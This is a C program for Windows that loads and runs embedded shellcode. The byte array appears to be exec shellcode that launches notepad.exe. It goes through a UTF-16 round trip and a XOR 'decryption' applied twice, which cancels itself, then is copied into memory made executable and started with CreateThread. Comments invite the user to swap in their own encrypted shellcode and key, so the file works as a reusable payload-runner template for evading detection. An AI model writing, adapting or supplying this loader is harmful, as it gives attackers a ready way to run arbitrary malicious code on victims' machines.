#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// Add your encrypted shellcode
unsigned char encoded_shell[196] = {
    0x00fc, 0x00e8, 0x0082, 0x0000, 0x0000, 0x0000, 0x0060, 0x0089, 0x00e5, 0x0031, 0x00c0, 0x0064,
    0x008b, 0x0050, 0x0030, 0x008b, 0x0052, 0x000c, 0x008b, 0x0052, 0x0014, 0x008b, 0x0072, 0x0028,
    0x000f, 0x00b7, 0x004a, 0x0026, 0x0031, 0x00ff, 0x00ac, 0x003c, 0x0061, 0x007c, 0x0002, 0x002c,
    0x0020, 0x00c1, 0x00cf, 0x000d, 0x0001, 0x00c7, 0x00e2, 0x00f2, 0x0052, 0x0057, 0x008b, 0x0052,
    0x0010, 0x008b, 0x004a, 0x003c, 0x008b, 0x004c, 0x0011, 0x0078, 0x00e3, 0x0048, 0x0001, 0x00d1,
    0x0051, 0x008b, 0x0059, 0x0020, 0x0001, 0x00d3, 0x008b, 0x0049, 0x0018, 0x00e3, 0x003a, 0x0049,
    0x008b, 0x0034, 0x008b, 0x0001, 0x00d6, 0x0031, 0x00ff, 0x00ac, 0x00c1, 0x00cf, 0x000d, 0x0001,
    0x00c7, 0x0038, 0x00e0, 0x0075, 0x00f6, 0x0003, 0x007d, 0x00f8, 0x003b, 0x007d, 0x0024, 0x0075,
    0x00e4, 0x0058, 0x008b, 0x0058, 0x0024, 0x0001, 0x00d3, 0x0066, 0x008b, 0x000c, 0x004b, 0x008b,
    0x0058, 0x001c, 0x0001, 0x00d3, 0x008b, 0x0004, 0x008b, 0x0001, 0x00d0, 0x0089, 0x0044, 0x0024,
    0x0024, 0x005b, 0x005b, 0x0061, 0x0059, 0x005a, 0x0051, 0x00ff, 0x00e0, 0x005f, 0x005f, 0x005a,
    0x008b, 0x0012, 0x00eb, 0x008d, 0x005d, 0x006a, 0x0001, 0x008d, 0x0085, 0x00b2, 0x0000, 0x0000,
    0x0000, 0x0050, 0x0068, 0x0031, 0x008b, 0x006f, 0x0087, 0x00ff, 0x00d5, 0x00bb, 0x00e0, 0x001d,
    0x002a, 0x000a, 0x0068, 0x00a6, 0x0095, 0x00bd, 0x009d, 0x00ff, 0x00d5, 0x003c, 0x0006, 0x007c,
    0x000a, 0x0080, 0x00fb, 0x00e0, 0x0075, 0x0005, 0x00bb, 0x0047, 0x0013, 0x0072, 0x006f, 0x006a,
    0x0000, 0x0053, 0x00ff, 0x00d5, 0x006e, 0x006f, 0x0074, 0x0065, 0x0070, 0x0061, 0x0064, 0x002e,
    0x0065, 0x0078, 0x0065, 0x0000
};

void decrypt(unsigned char* data, int data_len, unsigned char key) {
    for (int i = 0; i < data_len; i++) {
        data[i] ^= key;
    }
}

unsigned char* utf16_decode(const wchar_t* utf16_string, int data_len) {
    unsigned char* decoded_data = (unsigned char*)malloc(data_len);
    for (int i = 0; i < data_len; i++) {
        decoded_data[i] = (unsigned char)utf16_string[i];
    }
    return decoded_data;
}

int main() {
    unsigned char key = 0xAA; // Add your XOR key
    int shell_len = sizeof(encoded_shell) / sizeof(encoded_shell[0]);

    wchar_t* utf16_encoded_shell = (wchar_t*)malloc(shell_len * sizeof(wchar_t));
    for (int i = 0; i < shell_len; i++) {
        utf16_encoded_shell[i] = (wchar_t)encoded_shell[i];
    }

    unsigned char* decoded_shell = utf16_decode(utf16_encoded_shell, shell_len);
    free(utf16_encoded_shell);

    decrypt(decoded_shell, shell_len, key);
    decrypt(decoded_shell, shell_len, key);

    printf("Decrypted Shellcode: ");
    for (int i = 0; i < shell_len; i++) {
        printf("\\x%02x", decoded_shell[i]);
    }
    printf("\n");

    HANDLE hThread;
    LPVOID memoryAddress = VirtualAlloc(NULL, shell_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (memoryAddress == NULL) {
        fprintf(stderr, "Memory allocation failed, Error: %d\n", GetLastError());
        free(decoded_shell);
        return 1;
    }

    RtlMoveMemory(memoryAddress, decoded_shell, shell_len);
    free(decoded_shell);

    DWORD old_protection = 0;
    BOOL returned_vp = VirtualProtect(memoryAddress, shell_len, PAGE_EXECUTE_READ, &old_protection);
    if (returned_vp == FALSE) {
        fprintf(stderr, "Failed to change memory protection, Error: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Memory protection changed to executable [+]\n");

    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memoryAddress, NULL, 0, NULL);
    if (hThread == NULL) {
        fprintf(stderr, "[-] Cannot create a thread, Error: %d\n", GetLastError());
        return EXIT_FAILURE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    printf("[+] Thread execution completed [+]\n");

    return EXIT_SUCCESS;
}
